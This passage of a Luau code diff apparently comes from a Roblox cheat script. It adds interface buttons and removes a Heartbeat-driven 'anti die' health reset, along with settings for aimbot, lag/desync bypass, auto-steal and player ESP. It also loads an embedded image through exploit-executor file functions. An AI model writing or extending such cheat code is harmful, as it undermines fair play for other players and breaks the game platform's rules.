+    Size = UDim2.new(1, -8, 1, -8),
+    Position = UDim2.new(0, 4, 0, 4),
+    BackgroundTransparency = 1,
+}, main)
 
-	clearCharEntry(char, false)
+local function miniButton(name, text, x, width)
+    local btn = new("TextButton", {
+        Name = name,
+        ZIndex = 21,
+        Position = UDim2.new(0, x, 0.5, -14),
+        Size = UDim2.new(0, width, 0, 28),
+        BackgroundColor3 = C.card,
+        Text = text,
+        TextColor3 = C.white,
+        TextSize = 11,
+        Font = font("GothamBlack"),
+        AutoButtonColor = false,
+    }, miniBar)
+    corner(btn, 8)
+    stroke(btn, C.accent, 1.1, 0.3)
+    return btn
+end
 
-	hum.BreakJointsOnDeath = false
-	hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
+local miniLock = miniButton("MiniLock", state.Locked and "🔒" or "🔓", 0, 28)
+local miniBat = miniButton("MiniBat", state.AntiBat and "BAT ON" or "BAT OFF", 34, 72)
+local miniExpand = miniButton("MiniExpand", "⛶", 112, 40)
+miniExpand.BackgroundColor3 = C.accent
+stroke(miniExpand, C.glow, 1.1, 0.25)
 
-	local entry = { humanoid = hum }
-	entry.healthConn = hum:GetPropertyChangedSignal("Health"):Connect(function()
-	if antiDieEnabled and antiDieCharConns[char] == entry and hum.Health <= 0 then
-	hum.Health = hum.MaxHealth
-	end
-	end)
+local content = new("Frame", {
+    Name = "Content",
+    ZIndex = 3,
+    Position = UDim2.new(0, 12, 0, 58),
+    Size = UDim2.new(1, -24, 1, -70),
+    BackgroundTransparency = 1,
+}, main)
 
-	entry.diedConn = hum.Died:Connect(function()
-	task.defer(function()
-	if antiDieEnabled and antiDieCharConns[char] == entry and hum and hum.Parent then
-	hum.BreakJointsOnDeath = false
-	hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
-	hum.Health = hum.MaxHealth
-	end
-	end)
-	end)
+local pcContent = new("Frame", {
+    Name = "PCContent",
+    Size = UDim2.new(1, 0, 1, 0),
+    BackgroundTransparency = 1,
+    Visible = not state.MobileMode,
+}, content)
 
-	entry.cleanupConn = char.AncestryChanged:Connect(function()
-	if not char.Parent then
-	clearCharEntry(char, false)
-	end
-	end)
+local mobileContent = new("Frame", {
+    Name = "MobileContent",
+    Size = UDim2.new(1, 0, 1, 0),
+    BackgroundTransparency = 1,
+    Visible = state.MobileMode,
+}, content)
 
-	antiDieCharConns[char] = entry
-	end
+-- Mobile / compact rows: the layout shown in the screenshot.
+local function mobileButton(text, y)
+    local btn = new("TextButton", {
+        ZIndex = 5,
+        Position = UDim2.new(0, 0, 0, y),
+        Size = UDim2.new(1, 0, 0, 42),
+        BackgroundColor3 = C.card,
+        Text = text,
+        TextColor3 = C.white,
+        TextSize = 14,
+        Font = font("GothamBlack"),
+        AutoButtonColor = false,
+    }, mobileContent)
+    corner(btn, 11)
+    stroke(btn, C.accent, 1.2, 0.3)
+    return btn
+end
 
-	local function setAntiDieEnabled(enabled)
-	enabled = enabled == true
-	if enabled == antiDieEnabled then return end
-	antiDieEnabled = enabled
-	if enabled then
-	if not antiDieCharAddedConn then
-	antiDieCharAddedConn = Player.CharacterAdded:Connect(function(char)
-	task.wait(0.2)
-	if antiDieEnabled and char and char.Parent then
-	applyAntiDieToCharacter(char)
-	end
-	end)
-	end
-	local char = Player.Character
-	if char and char.Parent and not antiDieCharConns[char] then
-	applyAntiDieToCharacter(char)
-	end
-	else
-	for char in pairs(antiDieCharConns) do
-	clearCharEntry(char, true)
-	end
-	end
-	end
+local mobileLogic = mobileButton("LOGIC  ·  V" .. state.LogicVersion, 0)
+local mobileAnti = mobileButton("ANTI BAT  ·  OFF", 50)
+local mobileInf = mobileButton("INF JUMP  ·  OFF", 100)
+local mobileKey = mobileButton("KEY  ·  " .. state.Keybind.Name, 150)
 
-	-- Dos fuentes independientes piden el antidie:
-	--   "toggle"  -> toggle "Anti Die" del men  (siempre activo en gameplay)
-	--   "autobat" -> Auto Bat (activo mientras dure Auto Bat, V1)
-	-- El antidie queda activo si CUALQUIERA de las dos lo pide.
-	local antiDieSources = { toggle = false, autobat = false }
-	local function refreshAntiDie()
-	if antiDieStopped then return end
-	local manual = antiDieSources.toggle
-	if _G.__CrystalAntiDieGuiEnabled then manual = _G.__CrystalAntiDieGuiEnabled() == true end
-	setAntiDieEnabled(manual or antiDieSources.autobat)
-	end
+local function sizeCard(parent, y, compact)
+    local card = new("Frame", {
+        Name = "SizeCard",
+        ZIndex = 5,
+        Position = UDim2.new(0, 0, 0, y),
+        Size = UDim2.new(1, 0, 0, 42),
+        BackgroundColor3 = C.card,
+        BorderSizePixel = 0,
+    }, parent)
+    corner(card, 11)
+    stroke(card, C.accent, 1.2, 0.3)
 
-	_G.__CrystalAntiDieSource = function(source, enabled)
-	if antiDieStopped or antiDieSources[source] == nil then return end
-	antiDieSources[source] = enabled == true
-	refreshAntiDie()
-	end
+    local label = new("TextLabel", {
+        ZIndex = 6,
+        Position = UDim2.new(0, 12, 0, 0),
+        Size = UDim2.new(0.4, 0, 1, 0),
+        BackgroundTransparency = 1,
+        Text = compact and "SIZE" or "Size",
+        TextColor3 = C.white,
+        TextSize = 13,
+        Font = font("GothamBold"),
+        TextXAlignment = Enum.TextXAlignment.Left,
+    }, card)
 
-	_G.__CrystalAntiDieSet = function(enabled)
-	_G.__CrystalAntiDieSource("autobat", enabled)
-	end
+    local percent = new("TextLabel", {
+        ZIndex = 6,
+        AnchorPoint = Vector2.new(0.5, 0.5),
+        Position = UDim2.new(0.5, compact and 0 or 4, 0.5, 0),
+        Size = UDim2.new(0, 48, 0, 18),
+        BackgroundTransparency = 1,
+        Text = string.format("%.0f%%", state.UIScale * 100),
+        TextColor3 = C.accent2,
+        TextSize = 12,
+        Font = font("GothamBold"),
+    }, card)
 
-	_G.__CrystalAntiDieIsEnabled = function() return antiDieEnabled end
+    local buttonWidth = compact and 30 or 32
+    local buttonHeight = compact and 26 or 28
+    local plusOffset = compact and 12 or 10
+    local minusOffset = compact and 48 or 48
 
-	-- Registro para el reset total: apagar antidie y desconectar al
-	-- re-ejecutar el script.
-	_G.__CrystalTrackStopper(function()
-	antiDieStopped = true
-	antiDieSources.toggle = false
-	antiDieSources.autobat = false
-	setAntiDieEnabled(false)
-	end)
-	local antiDieCharAddedTracked = false
-	local _antiDieOrigSet = setAntiDieEnabled
-	setAntiDieEnabled = function(enabled)
-	_antiDieOrigSet(enabled)
-	if antiDieCharAddedConn and not antiDieCharAddedTracked then
-	antiDieCharAddedTracked = true
-	_G.__CrystalTrackConn(antiDieCharAddedConn)
-	end
-	end
-	_G.__CrystalTrackConn(RunService.Heartbeat:Connect(function()
-	if antiDieStopped then return end
-	refreshAntiDie()
-	if not antiDieEnabled then return end
-	local char = Player.Character
-	local hum = char and char.Parent and char:FindFirstChildOfClass("Humanoid")
-	if not hum then return end
-	local entry = antiDieCharConns[char]
-	-- Incluye respawns con Humanoid tardio y sustituciones dentro del personaje.
-	if not entry or entry.humanoid ~= hum then applyAntiDieToCharacter(char) end
-	if hum.BreakJointsOnDeath then hum.BreakJointsOnDeath = false end
-	if hum:GetStateEnabled(Enum.HumanoidStateType.Dead) then
-	hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
-	end
-	if hum.Health <= 0 then hum.Health = hum.MaxHealth end
-	end))
-	end
+    local minus = new("TextButton", {
+        ZIndex = 7,
+        AnchorPoint = Vector2.new(1, 0.5),
+        Position = UDim2.new(1, -minusOffset, 0.5, 0),
+        Size = UDim2.new(0, buttonWidth, 0, buttonHeight),
+        BackgroundColor3 = compact and C.card or C.panel,
+        Text = "−",
+        TextColor3 = C.white,
+        TextSize = 16,
+        Font = font("GothamBold"),
+        AutoButtonColor = false,
+    }, card)
+    corner(minus, 7)
+    stroke(minus, C.accent, 1, 0.35)
 
-	-- Ensure global toggle table exists
-	FeatureToggles = FeatureToggles or {}
+    local plus = new("TextButton", {
+        ZIndex = 7,
+        AnchorPoint = Vector2.new(1, 0.5),
+        Position = UDim2.new(1, -plusOffset, 0.5, 0),
+        Size = UDim2.new(0, buttonWidth, 0, buttonHeight),
+        BackgroundColor3 = compact and C.card or C.panel,
+        Text = "+",
+        TextColor3 = C.white,
+        TextSize = 16,
+        Font = font("GothamBold"),
+        AutoButtonColor = false,
+    }, card)
+    corner(plus, 7)
+    stroke(plus, C.accent, 1, 0.35)
 
-	-- ==================== VARIABLES GLOBALES ====================
-	local toggleStates = {}
-	local transientToggles = {
-	["Aimbot"] = true,
-	["Lagger Aimbot"] = true,
-	["Autoplay"] = true,
-	["Lagger"] = true,
-	}
-	local mobileFeatures = {
-	["Aimbot"] = true,
-	["Drop"] = true,
-	["TP Down"] = true,
-	["Autoplay"] = true,
-	["ESP Players"] = true,
-	["Player Tracers"] = true,
-	}
-	local mobileShortcutStates = {}
-	local mobileBtnPlaced = {}
-	for featName, _ in pairs(mobileFeatures) do
-	mobileShortcutStates[featName] = false
-	mobileBtnPlaced[featName] = true
-	end
+    return card, percent, minus, plus
+end
 
-	-- For Toggle UI: expose only the bind pill (panel open state shouldn't appear active)
-	if featureName == "Toggle UI" then
-	bindPill.Visible = true
-	bindPill.Position = UDim2.new(1, -48, 0.5, -10)
-	end
-	local speedValues = {
-	SkinPreset = 1,
-	NormalBoost = 59,
-	NormalSteal = 29,
-	LaggerBoost = 40,
-	LaggerSteal = 20,
-	DesyncBoost = 59,
-	DesyncSteal = 29,
-	BypassPower = 300000,
-	BypassDepth = 296,
-	MobileButtonScale = 1.0,
-	FOV = 90,
-	StretchIntensity = 0.75,
-	CypherAimbotApproachSpeed = 55,
-	AutoTPDownHeight = 20,
-	}
-	local customSpeeds = {}
-	local autoStealValues = {
-	Radius      = 65,
-	Duration    = 1.3,
-	}
-	local autoStealMode = "v1"
-	local selectedMode = "Normal"
-	local selectedIntroMusicIndex = 1
-	local normalSpeed = 59
-	local carrySpeed = 30
-	local laggerSpeed = 40
-	local speedToggled = false
-	local carrySpeedMode = "v1" -- "v1" = keybind mode, "v2" = toggle mode
-	local laggerEnabled = false
-	local lastMoveDir = Vector3.new(0, 0, 0)
-	local MOVE_KEYS = {
-	[Enum.KeyCode.W] = true, [Enum.KeyCode.A] = true, [Enum.KeyCode.S] = true, [Enum.KeyCode.D] = true,
-	[Enum.KeyCode.Up] = true, [Enum.KeyCode.Left] = true, [Enum.KeyCode.Down] = true, [Enum.KeyCode.Right] = true,
-	}
-	local _prevSpeed = false
-	local FeatureKeybinds = {
-	SelectNormalMode = nil,
-	SelectLaggerMode = nil,
-	Drop = nil,
-	Autoplay = nil,
-	["Toggle UI"] = nil,
-	["Speed Boost"] = nil,
-	["Aimbot"] = nil,
-	["Anti Bat"] = nil,
-	["Carry Speed"] = nil,
-	-- Mini UI keybinds (unified)
-	BypassToggle = nil,
-	BypassAuto = nil,
-	FuckerToggle = nil,
-	}
-	local listeningBindBtn = nil
-	local listeningFeature = nil
-	local _allBindBtns = {}
-	local _featureToggleMap = {}
-	local toggleVisualUpdaters = {}
-	local toggleStateSetters = {}
-	local ragdollCounterPaused = false
-	local FeaturePostToggle = FeaturePostToggle or {}
-	local FPSLabel = nil
-	local PingLabel = nil
-	local StatsRightFps = nil
-	local StatsRightPing = nil
-	_G = _G or {}
-	_G.__CrystalDropMode = (_G.__CrystalDropMode == "Jump Drop") and "Jump Drop" or "Stand Drop"
-	_G["_CrystalHub_UI_Data"] = _G["_CrystalHub_UI_Data"] or {}
-	local mobileButtonPositions = {}
-	local quickButtonPositions = {}
-	_G.__CrystalButtonsSize = 1
-	_G.__CrystalGuiPositionResetters = {}
-	_G.__CrystalResetButtonPositions = nil
-	_G.__CrystalGuiPositionsReset = false
-	_G.__CrystalRoundPanelBackground = function(image, panel)
-		local mask = Instance.new("CanvasGroup")
-		mask.Name = "RoundedBackgroundMask"
-		mask.Size = UDim2.fromScale(1, 1)
-		mask.Position = UDim2.fromOffset(0, 0)
-		mask.BackgroundTransparency = 1
-		mask.BorderSizePixel = 0
-		mask.GroupTransparency = 0
-		mask.ZIndex = image.ZIndex
-		mask.Parent = panel
-		local panelCorner = panel:FindFirstChildOfClass("UICorner")
-		local corner = Instance.new("UICorner", mask)
-		corner.CornerRadius = panelCorner and panelCorner.CornerRadius or UDim.new(0, 16)
-		local imageCorner = image:FindFirstChildOfClass("UICorner")
-		if imageCorner then imageCorner:Destroy() end
-		image.Parent = mask
-	end
-	-- Fondos compactos GLAZIER DUELS incluidos en la source.
-	_G.__GlazierLoadEmbeddedBackground = function(filename, encoded)
-		local loader = (type(getcustomasset) == "function" and getcustomasset)
-			or (type(getsynasset) == "function" and getsynasset)
-		if not loader or type(writefile) ~= "function" then return "" end
-		local ok, result = pcall(function()
-			local exists = type(isfile) == "function" and isfile(filename)
-			if not exists then
-				local alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
-				local values = {}
-				for i = 1, #alphabet do values[alphabet:sub(i, i)] = i - 1 end
-				local chunks = {}
-				for offset = 1, #encoded, 16384 do
-					local decoded = encoded:sub(offset, offset + 16383):gsub("....", function(group)
-						local a, b, c, d = group:sub(1,1), group:sub(2,2), group:sub(3,3), group:sub(4,4)
-						local n = values[a] * 262144 + values[b] * 4096 + (values[c] or 0) * 64 + (values[d] or 0)
-						local out = string.char(math.floor(n / 65536))
-						if c ~= "=" then out = out .. string.char(math.floor(n / 256) % 256) end
-						if d ~= "=" then out = out .. string.char(n % 256) end
-						return out
-					end)
-					chunks[#chunks + 1] = decoded
-					if #chunks % 16 == 0 then task.wait() end
-				end
-				writefile(filename, table.concat(chunks))
-			end
-			return loader(filename)
-		end)
-		if ok and type(result) == "string" then return result end
-		warn("[GLAZIER DUELS] No se pudo cargar el fondo: " .. tostring(result))
-		return ""
-	end
-	_G.__GlazierSanctuaryBackground = _G.__GlazierLoadEmbeddedBackground("GlazierDuels-Sanctuary.png", "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